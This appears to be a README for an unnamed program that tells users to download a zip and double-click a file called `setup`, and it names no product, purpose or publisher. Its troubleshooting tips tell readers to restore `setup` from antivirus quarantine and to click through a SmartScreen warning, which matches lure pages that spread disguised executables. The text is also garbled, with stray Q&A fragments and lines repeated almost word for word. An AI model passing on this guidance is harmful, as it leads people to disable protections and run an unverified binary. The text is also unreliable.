Extract the zip, open the folder, then run `setup`.

**Should I stack several wishes, or keep the ask narrow?**

Keep the ask to the one thing you wanted, and use one issue for it.

No. The archive carries what the build needs.

# Installation

1. Download the zip archive.
2. Right-click the archive and choose Extract All.
3. Open the folder that extraction created.
4. Double-click `setup`.

# If something goes wrong

<details><summary>Start file is a level further down</summary>

Open that inner folder so `setup` lines up with the other files.
</details>

<details><summary>Antivirus put `setup` in quarantine</summary>

Bring the held copy out of quarantine, then start `setup` from the folder that was extracted.
</details>

<details><summary>Cannot find `setup` where you looked</summary>

Go one level down. That is where `setup` sits with the other files.
</details>

<details><summary>SmartScreen Warning Information</summary>

When you extract the zip archive and run `setup`, you may see a SmartScreen warning. This occurs because Windows recognizes it as a new download, and you can follow the 'More info' path to proceed.
</details>

<details><summary>Shortcut still points at the old place</summary>

After the move, `setup` has to be started in the new folder.
</details>

<details><summary>A single file was copied and the rest stayed</summary>

Move `setup` back so the other files are with it again. Extracting the archive once more does the same job.
</details>

# How it is meant to be used

Leaving the extracted folder untouched lets the program find its files next to `setup`.

Reinstalling means extracting again. There is no separate install step.

To use the program, extract the contents of the zip archive to a folder. Start the program by double-clicking the `setup` file in that folder. If a later build is released, it will be in a new archive, and you can start it the same way.

# If you hit a problem

Keep the older folder until a bad new archive is sorted, provided you still have it.

Keep the old folder until the new archive is fixed, if you still have it.

Showing the problem takes three steps. A video does not have to be part of that.
